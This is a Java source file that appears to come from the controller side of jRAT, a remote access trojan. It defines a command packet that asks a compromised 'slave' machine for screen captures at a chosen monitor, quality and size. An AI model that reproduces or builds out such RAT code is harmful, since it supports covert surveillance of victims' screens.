package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet50UpdateRemoteScreen implements OutgoingPacket {
	
	private int monitor;
	private int quality;
	private int size;

	public Packet50UpdateRemoteScreen(int monitor, int quality, int size) {
		this.monitor = monitor;
		this.quality = quality;
		this.size = size;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(monitor);
		slave.writeInt(quality);
		slave.writeInt(size);
	}

	@Override
	public short getPacketId() {
		return 50;
	}

}
